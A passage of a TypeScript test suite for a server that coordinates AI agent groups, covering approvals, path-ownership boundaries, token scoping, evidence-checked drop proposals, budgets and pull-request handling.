切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : 无
反对 : 无
名字 : held-group-reapprove`,
    frontmatter_json: { draft_card: true },
  });
  expect((await post(app, `/api/v1/draft/${grp_id}/approve`)).status).toBe(200);
  return grp_id;
}

test("approving a held group twice does not blow up", async () => {
  // The first approve writes slices AND their tasks, then the boundary refuses. The
  // second one deleted the slices out from under those tasks — foreign keys are on,
  // so it was a 500, every time. The message it printed told the boss to do exactly
  // this, which is why "有的需求无法批准开工" had no way out at all.
  const h = await harness();
  const grpId = await blocked(h);
  expect((await post(h.app, `/api/v1/draft/${grpId}/approve`)).status).toBe(200);
  expect(await h.db.select({ id: slice.id }).from(slice).where(eq(slice.grp_id, grpId))).toHaveLength(3);
});

test("the group holding the paths dissolves, and the approved one starts itself", async () => {
  const h = await harness();
  const grpId = await blocked(h);
  await landed(h.db, 1);
  await sweepApproved(h.ctx);

  const g = (await first(
    h.db.select({ status: grp.status, approved_at: grp.approved_at }).from(grp).where(eq(grp.id, grpId)),
  ))!;
  expect(g.status).toBe("RUNNING");
  // Left set, the sweep would keep finding it forever.
  expect(g.approved_at).toBeNull();
  // Started, not merely unblocked: a RUNNING group with no turn queued is the same
  // silence from the boss's side.
  const turn = (await first(
    h.db
      .select({ payload_json: job.payload_json, slice_id: job.slice_id })
      .from(job)
      .where(and(eq(job.grp_id, grpId), eq(job.kind, "agent_turn")))
      .orderBy(desc(job.id)),
  ))!;
  expect(AgentTurnPayloadSchema.parse(turn.payload_json).role).toBe("engineer");
  expect(turn.slice_id).not.toBeNull();
});

test("the Architect re-cutting someone else's boundary starts the approved group", async () => {
  const h = await harness();
  const grpId = await blocked(h);
  await h.f.agent.create({ project_id: 1, grp_id: 1, role: "architect", token: "tok-a" });
  // The re-cut moves group 1 off the contested path. Nothing touches group 2 —
  // sweeping only the group `owns` names would leave it waiting.
  await post(h.app, "/orch/v1/owns", { group_id: 1, paths: ["src/c/**"] }, "tok-a");
  expect(await grpStatus(h.db, grpId)).toBe("RUNNING");
});

test("a token is only good for the scope it was hired into", async () => {
  // `owns_json` is what `canStart` gates dispatch on, so one call rewriting
  // another group's boundary is a fleet-wide stall — and the group_id came
  // straight out of the request body, never compared with the caller's own.
  // The check cannot be a flat "same group" either: standing roles have no group
  // and are supposed to reach across their project.
  const h = await harness();
  await blocked(h);
  const elsewhereProject = await h.f.project.create({
    name: "other",
    repo_path: "/tmp/o",
    remote: "https://github.com/o/other.git",
  });
  await h.f.runningGrp.create({ project_id: elsewhereProject.id, name: "elsewhere" });
  const outsider = (await first(h.db.select({ id: grp.id }).from(grp).where(eq(grp.name, "elsewhere"))))!.id;

  // Standing: no group, so its reach is its project — and it stops at the edge.
  await h.f.agent.create({ project_id: 1, role: "architect", token: "tok-standing" });
  expect((await post(h.app, "/orch/v1/owns", { group_id: 1, paths: ["src/c/**"] }, "tok-standing")).status).toBe(200);
  expect((await post(h.app, "/orch/v1/owns", { group_id: outsider, paths: ["**"] }, "tok-standing")).status).toBe(403);

  // Hired into a group: that group and no other, even inside the same project.
  await h.f.agent.create({ project_id: 1, grp_id: 1, role: "architect", token: "tok-g1" });
  const other = (await first(
    h.db
      .select({ id: grp.id })
      .from(grp)
      .where(and(eq(grp.project_id, 1), ne(grp.id, 1)))
      .orderBy(asc(grp.id)),
  ))!.id;
  expect((await post(h.app, "/orch/v1/owns", { group_id: other, paths: ["**"] }, "tok-g1")).status).toBe(403);
  // Untouched: a refused call must not be a half-applied one.
  expect((await first(h.db.select({ o: grp.owns_json }).from(grp).where(eq(grp.id, other))))!.o).not.toContain("**");
});

test("dropping a requirement frees its paths and starts whoever was waiting", async () => {
  // `Return for re-decomposition` was the only way off the approval screen, and it sends the plan back
  // to be written again. A duplicate needs to leave, and the group behind it needs
  // to stop waiting on paths nobody will ever use.
  const h = await harness();
  const grpId = await blocked(h);
  await h.f.job.create({ grp_id: 1, state: "pending" });
  await h.f.escalation.create({ grp_id: 1, severity: "blocker", question: "still needed?", chain_state: "boss" });

  const r = await post(h.app, "/api/v1/groups/1/drop", { why: "grp2 covers it" });
  expect(r.status).toBe(200);
  expect(StartedResponse.parse(await r.json())).toEqual({ started: [grpId] });

  expect(await grpStatus(h.db)).toBe("DISSOLVED");
  const lastTurn = await first(
    h.db
      .select({ state: job.state })
      .from(job)
      .where(and(eq(job.grp_id, 1), eq(job.kind, "agent_turn")))
      .orderBy(desc(job.id)),
  );
  expect(lastTurn?.state).toBe("cancelled");
  // A question that outlives its requirement sits in `To do` forever.
  const orphan = await first(
    h.db.select({ s: escalation.chain_state }).from(escalation).where(eq(escalation.grp_id, 1)),
  );
  expect(orphan?.s).toBe("revoked");
  expect(await grpStatus(h.db, grpId)).toBe("RUNNING");
});

test("a planner may propose dropping already-covered work, but only with evidence", async () => {
  // "There is nothing to do here" is the most attractive thing a tired model can
  // conclude, so a sentence alone must not be able to close a requirement — that is
  // the model's opinion of its own workload. The server checks the evidence, and
  // the boss still presses the button.
  const h = await harness();
  await h.f.agent.create({ project_id: 1, grp_id: 1, role: "dispatcher", token: "tok-d" });
  await h.f.runningGrp.create({ project_id: 1, name: "other" });
  const drop = (b: Json, tok = "tok-d") => post(h.app, "/orch/v1/drop", b, tok);

  expect((await drop({ group_id: 1, why: "已经做完了" })).status).toBe(422);
  expect((await drop({ group_id: 1, why: "短", duplicate: 2 })).status).toBe(422);
  expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 1 })).status).toBe(422);
  // A writer cannot decide its own work is unnecessary.
  expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 2 }, "tok-eng")).status).toBe(422);

  expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 2 })).status).toBe(200);
  const st = await state(h.app);
  const p = st.dropProposals.find((proposal) => proposal.grpId === 1);
  if (!p) throw new Error("drop proposal missing from snapshot");
  expect(p.body).toContain("grp2 已经覆盖");
  expect(p.body).toContain("other");
  // Still the boss's call: proposing does not dissolve anything.
  expect(await grpStatus(h.db)).not.toBe("DISSOLVED");
});

test("a commit is evidence only when it is real and already on the base branch", async () => {
  // The commit half of the evidence check: a sha is cheap to type, so the server
  // asks the repo itself — the object must exist, be a commit, and be an ancestor
  // of the base branch, or "already done" is just a claim.
  const landed = { code: 0 };
  const objectType = { out: "commit" };
  const h = await harness((cmd) => {
    if (cmd.includes("cat-file")) return objectType;
    if (cmd.includes("merge-base")) return landed;
    return {};
  });
  await h.f.agent.create({ project_id: 1, grp_id: 1, role: "dispatcher", token: "tok-d" });
  const sha = "0123456789abcdef0123456789abcdef01234567";
  const drop = (b: Json) => post(h.app, "/orch/v1/drop", b, "tok-d");

  expect((await drop({ group_id: 1, why: "这件事已经合并进主干了", commit: "not-a-sha" })).status).toBe(422);
  // A sha-shaped string that names something else — a tree, a tag — is not work.
  objectType.out = "tree";
  expect((await drop({ group_id: 1, why: "这件事已经合并进主干了", commit: sha })).status).toBe(422);
  objectType.out = "commit";
  const ok = await drop({ group_id: 1, why: "这件事已经合并进主干了", commit: sha });
  expect(ok.status).toBe(200);
  const st = await state(h.app);
  const p = st.dropProposals.find((proposal) => proposal.grpId === 1);
  if (!p) throw new Error("drop proposal missing from snapshot");
  expect(p.body).toContain("already landed");

  // The same sha, not yet merged: real work, wrong place — still the boss's call,
  // but the proposal must not file.
  landed.code = 1;
  expect((await drop({ group_id: 1, why: "这个提交还没有合进主干", commit: sha })).status).toBe(422);
});

test("the boundary request quotes each group's own requirement", async () => {
  const { app, db, f } = await harness();
  // The pre-existing group's idea has to be recoverable, or the Architect cannot
  // tell the groups apart — observed live, it gave one group the other's files.
  await f.event.create({ grp_id: 1, author: "boss", kind: "boss_say", body: "greet 加中文支持", at: 1 });
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "farewell: bye(name) 返回 goodbye X" });
  const { grp_id } = GroupIdResponse.parse(await r.json());

  const queuedTurn = (await architectTurn(db, grp_id))!;
  const boundary = BoundaryIdeasPayload.parse(queuedTurn.payload_json).boundary;
  expect(boundary.find((g) => g.id === 1)?.idea).toContain("greet");
  expect(boundary.find((g) => g.id === grp_id)?.idea).toContain("bye");
});

test("a project is a repository, and a path is not one", async () => {
  const { app } = await harness();
  // There is no host-path flow left to mistype into: `repo_path` holds
  // `owner/name` and the picker only offers repositories the app is installed
  // on. A body without one is refused rather than half-registered.
  const r = await post(app, "/api/v1/projects", { name: "p", repo_path: "/Users/me/code/thing" });
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("owner/name");
});

test("registering a repo you cannot push to succeeds, and says so at once", async () => {
  // The whole value of this check is *when* the boss learns. Read access is
  // enough to clone and work, so registration is not refused — but a group that
  // does everything and then cannot push is the worst moment to find out, and an
  // `if` plus an emit is exactly what gets tidied away by someone who does not
  // know why it is there.
  const { app, db, ctx } = await harness();
  ctx.gh = githubAnswer({
    full_name: "someone/theirs",
    default_branch: "main",
    clone_url: "https://github.com/someone/theirs.git",
    permissions: { pull: true, push: false },
  });

  const r = await post(app, "/api/v1/projects", { repo: "someone/theirs" });
  expect(r.status).toBe(200);
  expect(
    (await db.select({ id: project.id }).from(project).where(eq(project.repo_path, "someone/theirs"))).length,
  ).toBe(1);

  // Named level, so the boss knows what to ask for rather than that "something"
  // is wrong.
  const said = (await first(
    db.select({ body: event.body }).from(event).where(eq(event.severity, "blocker")).orderBy(desc(event.seq)),
  ))!.body;
  expect(said).toContain("READ");
  expect(said).toContain("someone/theirs");
});

test("the directory list marks git repos and what is already registered", async () => {
  const { app, f } = await harness();
  const root = tempDir("orch-dirs-");
  mkdirSync(join(root, "a-plain"));
  mkdirSync(join(root, "b-repo/.git"), { recursive: true });
  mkdirSync(join(root, "c-taken/.git"), { recursive: true });
  mkdirSync(join(root, ".hidden"));
  await f.project.create({ name: "t", repo_path: join(root, "c-taken") });

  const r = await get(app, `/api/v1/dirs?path=${encodeURIComponent(root)}`);
  expect(r.status).toBe(200);
  const out = DirsResponse.parse(await r.json());
  // Repos first: the boss is looking for one, so burying them under plain folders
  // makes the picker useless in a deep tree.
  expect(out.dirs.map((dir) => dir.name)).toEqual(["b-repo", "c-taken", "a-plain"]);
  expect({
    "b-repo is a repo": out.dirs.find((dir) => dir.name === "b-repo")?.repo,
    "c-taken is taken": out.dirs.find((dir) => dir.name === "c-taken")?.taken,
    "a-plain is a repo": out.dirs.find((dir) => dir.name === "a-plain")?.repo,
  }).toEqual({ "b-repo is a repo": true, "c-taken is taken": true, "a-plain is a repo": false });
  // Dotfiles are noise in a picker.
  expect(out.dirs.filter((dir) => dir.name === ".hidden")).toEqual([]);
  expect(out.parent).toBe(dirname(root));
});

test("an unreadable path is an error with the reason, not an empty list", async () => {
  const { app } = await harness();
  const r = await get(app, "/api/v1/dirs?path=/definitely/not/here");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("no such file");
});

test("a closed PR whose branch cannot be reopened can still get a new one", async () => {
  const { app, db, ctx } = await harness();
  await db.update(grp).set({ status: "PAUSED", pr_number: 7, branch: "orch/g1" }).where(eq(grp.id, 1));
  await db.update(project).set({ remote: "git@github.com:me/x.git" }).where(eq(project.id, 1));
  ctx.gh = githubAnswer({ number: 9 });

  const r = await post(app, "/api/v1/groups/1/newpr");
  expect(r.status).toBe(200);
  expect(PullRequestResponse.parse(await r.json()).number).toBe(9);
  const g = (await first(
    db
      .select({ status: grp.status, pr_number: grp.pr_number, merge_seq: grp.merge_seq })
      .from(grp)
      .where(eq(grp.id, 1)),
  ))!;
  expect(g.status).toBe("PR_OPEN");
  expect(g.pr_number).toBe(9);
  // Back in the queue, or it would be finished work nobody merges.
  expect(g.merge_seq).toBeGreaterThan(0);
});

test("a failed second PR leaves the old number in place rather than none at all", async () => {
  // The push is refused. Since 007 step 5 that happens in the utility container
  // rather than on the host, so this is a sandbox command failing rather than
  // `ctx.git` — the assertion is about what the group is left holding either way.
  const { app, db, ctx } = await harness((cmd) =>
    cmd.includes("push") ? { code: 1, out: "remote: Permission denied" } : {},
  );
  await db.update(grp).set({ status: "PAUSED", pr_number: 7, branch: "orch/g1" }).where(eq(grp.id, 1));
  await db.update(project).set({ remote: "git@github.com:me/x.git" }).where(eq(project.id, 1));
  // A GitHub that would happily open the PR. Without a number here the create
  // answers "no PR number in it" and the route 422s for a reason that has
  // nothing to do with the push — the test passes and asserts nothing.
  ctx.gh = githubAnswer({ number: 9 });

  expect((await post(app, "/api/v1/groups/1/newpr")).status).toBe(422);
  expect((await first(db.select({ n: grp.pr_number }).from(grp).where(eq(grp.id, 1))))?.n).toBe(7);
});

test("nobody confirms a merge by hand: GitHub is the only source, and it winds the group up", async () => {
  const { app, db, ctx } = await harness();
  await db.update(grp).set({ status: "PR_OPEN", pr_number: 7, merge_seq: 1 }).where(eq(grp.id, 1));

  // The button that asked the boss to confirm is gone. It dissolved a group on
  // trust, and one mis-click archived a branch whose PR was still open.
  //
  // 422 with the action named, where this used to be a 404. The list of actions
  // was in the route's regular expression and is a zod enum now, so "no such
  // action" is an answer rather than a missing page — which is the honest reply,
  // since `/api/v1/groups/1/…` is very much a route that exists.
  const no = await post(app, "/api/v1/groups/1/landed");
  expect(no.status).toBe(400);
  expect(await no.text()).toContain("action");
  expect(await grpStatus(db)).toBe("PR_OPEN");

  // What `pollPrs` calls when GitHub says MERGED. Delivered, and still visible.
  await landGroup(ctx, 1, "github");
  const snap = await state(app);
  expect(snap.groups.filter((group) => group.id === 1)).toEqual([]);
  expect(snap.archived.map((group) => group.name)).toEqual(["g1"]);
});

test("raising a budget resumes the group and closes the question that asked", async () => {
  const { app, db, f } = await harness();
  await db.update(grp).set({ status: "PAUSED", budget_tokens: 100, spent_tokens: 120 }).where(eq(grp.id, 1));
  await f.escalation.create({
    grp_id: 1,
    severity: "blocker",
    // Not the shipped sentence, and not in the shipped language: `dedupe_key` is
    // what `raiseBudget` closes on, so the wording is free to be anything.
    question: "rewritten by a translator",
    dedupe_key: escalationKey.budget,
    chain_state: "boss",
  });

  // `Resume` alone is a lie: the scheduler will not admit an over-budget group.
  const resumed = await post(app, "/api/v1/groups/1/resume");
  expect(resumed.status).toBe(422);
  expect(await resumed.text()).toContain("120/100");

  // A cap below what is already spent would stop it again on the next tick.
  expect((await post(app, "/api/v1/groups/1/budget", { tokens: 110 })).status).toBe(422);

  expect((await post(app, "/api/v1/groups/1/budget", { tokens: 300 })).status).toBe(200);
  const g = (await first(
    db.select({ status: grp.status, budget_tokens: grp.budget_tokens }).from(grp).where(eq(grp.id, 1)),
  ))!;
  expect(g.status).toBe("RUNNING");
  expect(g.budget_tokens).toBe(300);
  expect(await db.select({ id: escalation.id }).from(escalation).where(isNull(escalation.answer))).toHaveLength(0);
});

test("a sent-back DRAFT stops being approvable", async () => {
  const { app, db, f } = await harness();
  await db.update(grp).set({ status: "DRAFT" }).where(eq(grp.id, 1));
  await f.note.create({
    grp_id: 1,
    kind: "decision",
    lang: "中文",
    body: "old card",
    // `true`, not `1`: the column is `jsonb` and the card filter matches on
    // `@> '{"draft_card": true}'`, which a numeric 1 does not satisfy.
    frontmatter_json: { draft_card: true },
    at: 1,
  });
  expect((await get(app, "/api/v1/state")).status).toBe(200);

  await post(app, "/api/v1/draft/1/reject", { reason: "切得太粗" });
  expect(await grpStatus(db)).toBe("PLANNING");
  // The rejected card is no longer offered as a decision.
  const snap = await state(app);
  expect(snap.draftCards).toEqual([]);
});

test("the boss can talk to the team, and triage decides what the words mean", async () => {
  const { app, db, ran, f } = await harness();
  await f.agent.create({ project_id: 1, grp_id: 1, role: "pm", model: "sonnet", token: "tok-pm" });
  expect((await post(app, "/api/v1/say", { group_id: 1, body: "" })).status).toBe(400);

  expect((await post(app, "/api/v1/say", { group_id: 1, body: "测试写得太浅" })).status).toBe(200);
  const woken = ran.filter((j) => j.kind === "agent_turn");
  expect(woken.length).toBe(1);
  expect(AgentTurnPayloadSchema.parse(woken[0]!.payload_json).mail?.from).toBe("boss");

  // respec is the one that matters: without it dissatisfaction only ever reads as
  // "change one line" and a wrong decomposition is never corrected.
  expect((await post(app, "/api/v1/say", { group_id: 1, as: "respec", body: "方向错了" })).status).toBe(200);
  expect(await grpStatus(db)).toBe("PLANNING");
});

test("the blackboard is readable: notes by project, by group, and by kind", async () => {
  const { app, f } = await harness();
  await f.note.create({
    project_id: 1,
    grp_id: 1,
    kind: "journal",
    lang: "中文",
    body: "moved token check into middleware",
    frontmatter_json: { files: ["auth/mw.ts"], gate: "pass" },
    at: 10,
  });
  await f.note.create({
    project_id: 1,
    kind: "lesson",
    lang: "中文",
    body: "QA 只看 diff，不重读全库",
    at: 20,
  });
  // The DRAFT card is a note too, and it has its own screen; it must not show up here.
  await f.note.create({
    project_id: 1,
    grp_id: 1,
    kind: "decision",
    lang: "中文",
    body: "card",
    // `true`, not `1`: the column is `jsonb` and the card filter matches on
    // `@> '{"draft_card": true}'`, which a numeric 1 does not satisfy.
    frontmatter_json: { draft_card: true },
    at: 30,
  });

  const all = NotesResponseSchema.parse(await (await get(app, "/api/v1/notes?project=1")).json());
  expect(all.notes.map((note) => note.kind)).toEqual(["lesson", "journal"]);
  // A project-level lesson has no group, and that is exactly where it matters.
  expect(all.notes.find((note) => note.kind === "lesson")?.grpId).toBe(null);
  expect(all.notes.find((note) => note.kind === "journal")?.group).toBe("g1");

  const one = NotesResponseSchema.parse(await (await get(app, "/api/v1/notes?group=1")).json());
  expect(one.notes.map((note) => note.kind)).toEqual(["journal"]);

  const kind = NotesResponseSchema.parse(await (await get(app, "/api/v1/notes?project=1&kind=lesson")).json());
  expect(kind.notes.length).toBe(1);
});

test("a rescan that reaches no container leaves the repository's own skills alone", async () => {
  // The repository half of the list is a cache, and an empty inventory is a real
  // answer there — that is how a deleted skill stops being listed. So a rescan
  // that could not reach a container must not speak for the repository: this
  // group has no `sandbox_id`, and the previous inventory has to survive.
  const h = await harness();
  await cacheProjectSkills(h.db, 1, `ORCHSKILL .claude/skills/deploy/SKILL.md ${btoa("---\n---\n")}`);
  expect((await projectSkills(h.db, 1)).map((s) => s.name)).toEqual(["deploy"]);

  expect((await post(h.app, "/api/v1/skills", { project: 1 })).status).toBe(200);
  expect((await projectSkills(h.db, 1)).map((s) => s.name)).toEqual(["deploy"]);
});

test("skills are found through symlinks, and a block-scalar description is read", () => {
  const root = tempDir("orch-skills-");
  // A real machine's skills are mostly symlinks into plugins or a shared
  // .agents/skills, and a dirent for a symlink does not say "directory" — which hid
  // almost all of them.
  mkdirSync(join(root, "elsewhere/tidy"), { recursive: true });
  writeFileSync(
    join(root, "elsewhere/tidy/SKILL.md"),
    "---\nname: tidy\ndescription: |\n  Guard clauses first.\n  Then the happy path.\n---\nbody\n",
  );
  mkdirSync(join(root, ".claude/skills"), { recursive: true });
  symlinkSync(join(root, "elsewhere/tidy"), join(root, ".claude/skills/tidy"));
  mkdirSync(join(root, ".claude/skills/plain"), { recursive: true });
  writeFileSync(join(root, ".claude/skills/plain/SKILL.md"), "---\ndescription: one line\n---\nbody\n");

  const found = listSkills(root).filter((s) => s.scope === "project");
  expect(found.map((s) => s.name).sort()).toEqual(["plain", "tidy"]);
  expect(found.find((s) => s.name === "tidy")!.description).toBe("Guard clauses first. Then the happy path.");
  expect(found.find((s) => s.name === "plain")!.description).toBe("one line");
});

test("one box holding several unrelated asks becomes several requirements", async () => {
  const { app, db, ran, f } = await harness();
  await db.update(grp).set({ status: "PLANNING" }).where(eq(grp.id, 1));
  await f.note.create({
    project_id: 1,
    grp_id: 1,
    lang: "中文",
    body: "记住我；导出 CSV；顺便问下缓存怎么配",
    at: 1,
  });
  await f.agent.create({ project_id: 1, grp_id: 1, role: "dispatcher", model: "opus", token: "tok-disp" });

  // A split of one is not a split.
  const one = await post(app, "/orch/v1/split", { group_id: 1, requirements: [{ idea: "只有一件事" }] }, "tok-disp");
  expect(one.status).toBe(422);
  expect(await one.text()).toContain("at least 2");

  const r = await post(
    app,
    "/orch/v1/split",
    {
      group_id: 1,
      requirements: [
        { name: "remember-me", idea: "登录页加「记住我」" },
        { name: "csv-export", idea: "报表页加导出 CSV" },
      ],
      why: "两件事互不相关",
    },
    "tok-disp",
  );
  expect(r.status).toBe(200);

  // Two live requirements, each with its own dispatcher turn — so each gets its own
  // card, branch and PR, and the boss can accept or reject them apart.
  const live = await db.select({ id: grp.id, name: grp.name, status: grp.status }).from(grp).orderBy(asc(grp.id));
  expect(live.map((g) => [g.name, g.status])).toEqual([
    ["g1", "DISSOLVED"],
    ["remember-me", "PLANNING"],
    ["csv-export", "PLANNING"],
  ]);
  const turns = ran.filter(
    (j) => j.kind === "agent_turn" && AgentTurnPayloadSchema.parse(j.payload_json).role === "dispatcher",
  );
  expect(turns.map((j) => j.grp_id)).toEqual([2, 3]);
  // Nothing the boss typed is lost: each child points back at the original paragraph.
  const child = (await first(db.select({ body: note.body }).from(note).where(eq(note.grp_id, 2))))!;
  expect(child.body).toContain("记住我");
  expect(child.body).toContain("原始整段见 note #1");

  // g1's own dispatcher cannot reach into a child: each child gets its own turn
  // and its own agent, and a token is only good for the group it was hired into.
  const notMine = await post(
    app,
    "/orch/v1/split",
    { group_id: 2, requirements: [{ idea: "a" }, { idea: "b" }] },
    "tok-disp",
  );
  expect(notMine.status).toBe(403);

  // After a card is approved there is a branch, and re-cutting is the boss's respec.
  await db.update(grp).set({ status: "RUNNING" }).where(eq(grp.id, 2));
  await f.agent.create({ project_id: 1, grp_id: 2, role: "dispatcher", model: "opus", token: "tok-disp-2" });
  const late = await post(
    app,
    "/orch/v1/split",
    { group_id: 2, requirements: [{ idea: "a" }, { idea: "b" }] },
    "tok-disp-2",
  );
  expect(late.status).toBe(422);
  expect(await late.text()).toContain("respec");
});

test("a group blocked outside its boundary hands the work on and waits for it", async () => {
  // The gap seen whole: a gate failed on a file outside the group's owns, no verb
  // opened a requirement for it, so the group rewrote its own code and stopped.
  //
  // The existence check runs in the group's own checkout: the host's sits on
  // whatever branch the boss last had out, so a file the group itself created
  // came back as "not a file in this repo". The fake stands in for the container.
  const present = new Set(["package.json", "src/a/x.ts", "tsconfig.json"]);
  const h = await harness((cmd) => {
    const m = /^test -e '\/work\/(.+)'$/.exec(cmd);
    return m ? { code: present.has(m[1]!) ? 0 : 1 } : {};
  });
  await h.db
    .update(grp)
    .set({ owns_json: ["src/a/**"] })
    .where(eq(grp.id, 1));
  const blocked = (b: Json, tok = "tok-eng") => post(h.app, "/orch/v1/blocked", b, tok);

  expect((await blocked({ group_id: 1, path: "tsconfig.json" })).status).toBe(422);
  // An invented path must not be able to stop a group. The `--why` here is long
  // enough to get past the length check, or this asserts that instead — which is
  // what it used to do, so the existence check was never covered at all.
  const invented = await blocked({ group_id: 1, path: "nope.json", why: "缺一行配置，闸门过不了" });
  expect(invented.status).toBe(422);
  expect(await invented.text()).toContain("not a file in your checkout");
  // Inside its own boundary it is expected to fix it — saying otherwise is the
  // cheap way out of difficult work.
  const mine = await blocked({ group_id: 1, path: "src/a/x.ts", why: "缺一行配置，闸门过不了" });
  expect(mine.status).toBe(422);
  expect(await mine.text()).toContain("inside your own boundary");

  const r = await blocked({ group_id: 1, path: "package.json", why: "缺 allowImportingTsExtensions，闸门必红" });
  expect(r.status).toBe(200);
  const target = z.object({ blocked_on: z.number() }).parse(await r.json()).blocked_on;

  const me = (await first(
    h.db.select({ status: grp.status, blocked_on: grp.blocked_on }).from(grp).where(eq(grp.id, 1)),
  ))!;
  expect(me.status).toBe("PAUSED");
  expect(me.blocked_on).toBe(target);
  // Nobody owns package.json, so it becomes a requirement the boss approves like
  // any other — planning starts without waiting for anyone.
  const planning = { status: await grpStatus(h.db, target) };
  expect(planning.status).toBe("PLANNING");
});

test("a live group that owns the path gets it as an addition, not a rival group", async () => {
  // A second group for the same file would be refused by canStart anyway, so
  // opening one would only produce a requirement that can never start.
  const h = await harness();
  const repo = tempDir("orch-blocked2-");
  writeFileSync(join(repo, "package.json"), "{}");
  await h.db.update(project).set({ repo_path: repo }).where(eq(project.id, 1));
  await h.db
    .update(grp)
    .set({ owns_json: ["src/a/**"] })
    .where(eq(grp.id, 1));
  await h.f.runningGrp.create({ project_id: 1, name: "owner", owns_json: ["package.json"] });
  const r = await post(
    h.app,
    "/orch/v1/blocked",
    { group_id: 1, path: "package.json", why: "缺一行配置，闸门必红" },
    "tok-eng",
  );
  expect(z.object({ handedTo: z.string() }).parse(await r.json()).handedTo).toBe("owner");
  const p = AgentTurnPayloadSchema.parse(
    (await first(
      h.db.select({ payload_json: job.payload_json }).from(job).where(eq(job.grp_id, 2)).orderBy(desc(job.id)),
    ))!.payload_json,
  );
  expect(p.role).toBe("pm");
  expect(p.rejection).toContain("package.json");
});

test("a question no answer can resolve becomes a requirement, and the group waits for it", async () => {
  // The commonest blocker on the queue is one no answer resolves: a config file is
  // wrong, four groups are red on one line. Answering means typing the fix into a
  // chat box for an agent that is not allowed to apply it, so these sat in `To do`
  // until the boss did the work by hand.
  const h = await harness();
  await h.db.update(grp).set({ status: "PAUSED", paused_at: 1 }).where(eq(grp.id, 1));
  await h.f.escalation.create({
    grp_id: 1,
    severity: "blocker",
    question: "S1 连续 3 次没过闸门，根因是 tsconfig.json 少一行",
    chain_state: "boss",
  });

  const r = await post(h.app, "/api/v1/escalations/1/requirement", { text: "加 allowImportingTsExtensions" });
  expect(r.status).toBe(200);
  const { grp_id } = GroupIdResponse.parse(await r.json());

  const made = { status: await grpStatus(h.db, grp_id) };
  expect(made.status).toBe("PLANNING");
  // The question is closed with a pointer, not left as a second thing to remember.
  const esc = (await first(
    h.db.select({ answer: escalation.answer, chain_state: escalation.chain_state }).from(escalation),
  ))!;
  expect(esc.chain_state).toBe("answered");
  expect(esc.answer).toContain(String(grp_id));
  // And the stopped group comes back by itself when that lands — same mechanism
  // as `orch blocked`, so this is not a new thing to remember either.
  expect((await first(h.db.select({ b: grp.blocked_on }).from(grp).where(eq(grp.id, 1))))!.b).toBe(grp_id);
});

test("two groups cannot end up waiting on each other", async () => {
  // Both PAUSED for a stated reason, and the reason is each other. Nothing
  // downstream would notice: neither will ever dissolve, so neither is ever freed.
  const h = await harness();
  const repo = tempDir("orch-cycle-");
  writeFileSync(join(repo, "shared.ts"), "");
  await h.db.update(project).set({ repo_path: repo }).where(eq(project.id, 1));
  await h.db
    .update(grp)
    .set({ owns_json: ["src/a/**"] })
    .where(eq(grp.id, 1));
  await h.f.grp.create({
    project_id: 1,
    name: "other",
    status: "PAUSED",
    owns_json: ["shared.ts"],
    blocked_on: 1,
  });
  const r = await post(
    h.app,
    "/orch/v1/blocked",
    { group_id: 1, path: "shared.ts", why: "缺一行配置，闸门必红" },
    "tok-eng",
  );
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("already waiting on you");
});

test("a worktree that cannot be created withdraws the approval instead of retrying forever", async () => {
  // sweepApproved runs on the watchdog tick, so leaving the intent set retried a
  // permanent failure every thirty seconds and returned the error to nobody.
  // The clone is what cannot be created, and since 007 step 5 it fails inside
  // the group's own container rather than as a host `git worktree`.
  const h = await harness((cmd) => (cmd.startsWith("git clone") ? { code: 1, err: "fatal: disk full" } : {}));
  await h.db.update(grp).set({ status: "DRAFT", approved_at: 1 }).where(eq(grp.id, 1));

  await sweepApproved(h.ctx);
  const g = (await first(
    h.db.select({ status: grp.status, approved_at: grp.approved_at }).from(grp).where(eq(grp.id, 1)),
  ))!;
  expect(g.approved_at).toBeNull();
  expect(g.status).toBe("DRAFT");
  const esc = (await first(
    h.db
      .select({ chain_state: escalation.chain_state, brief: escalation.brief, question: escalation.question })
      .from(escalation),
  ))!;
  expect(esc.chain_state).toBe("boss");
  // The message by its identity, not a copy of its text: `said()` hashes the
  // English source, so a reworded sentence reddens this and a retranslated one
  // does not. The locale is the one `Bus.prepare` reads, never a literal.
  expect(esc.brief).toBe(renderSaid(h.ctx.config.language, said("the approval did not take")));
  // And the reason itself reaches the boss, which is the part no catalogue owns.
  expect(esc.question).toContain("disk full");
});

test("a question carries one line for the queue, given or derived", () => {
  // Given: whatever the agent wrote, capped.
  expect(brief("卡在 playwright 没装", "long question…")).toBe("卡在 playwright 没装");
  // Missing: the first sentence, which usually names the problem. A question that
  // cannot be filed for want of a flag is an agent stuck on formatting.
  expect(brief(undefined, "S2 的验收跑不了。原因是 worktree 里没装 playwright")).toBe("S2 的验收跑不了");
  // Long: cut, with the cut marked.
  expect(brief("x".repeat(60), "q")).toBe(`${"x".repeat(39)}…`);
});

test("what a question is about comes from a closed set", () => {
  // Closed because the queue groups by it: free text gives twelve spellings of
  // "environment" and groups nothing.
  expect(askKind("env")).toBe("env");
  expect(askKind(" spec ")).toBe("spec");
  // Unknown or missing falls to `other` rather than being rejected. An agent
  // must never be stuck on a taxonomy — same rule as the brief.
  expect(askKind("环境")).toBe("other");
  expect(askKind(undefined)).toBe("other");
});

test("reads are scoped by the token too, not only writes", async () => {
  // `/orch/v1/task` and the lease log never called agentOf. The mailbox's `/orch/v1/`
  // prefix gate says which routes a sandbox can reach; it says nothing about who
  // is reaching them, so any group could read any other group's cards and build
  // logs by putting a number in the URL.
  const { app, f } = await harness();
  await f.runningGrp.create({ project_id: 1, name: "g2" });
  await f.agent.create({ project_id: 1, grp_id: 2, model: "sonnet", token: "tok-other" });
  await f.task.create({ grp_id: 1, title: "g1 only" });
  await f.resource.create({ name: "browser", template: "echo {url}" });
  await f.lease.create({ resource: "browser", grp_id: 1, state: "done", log_path: "/tmp/nope.log" });

  expect((await get(app, "/orch/v1/task")).status).toBe(401);
  expect(await (await withToken(app, "/orch/v1/task", "tok-eng")).text()).toContain("g1 only");
  expect(await (await withToken(app, "/orch/v1/task", "tok-other")).text()).not.toContain("g1 only");

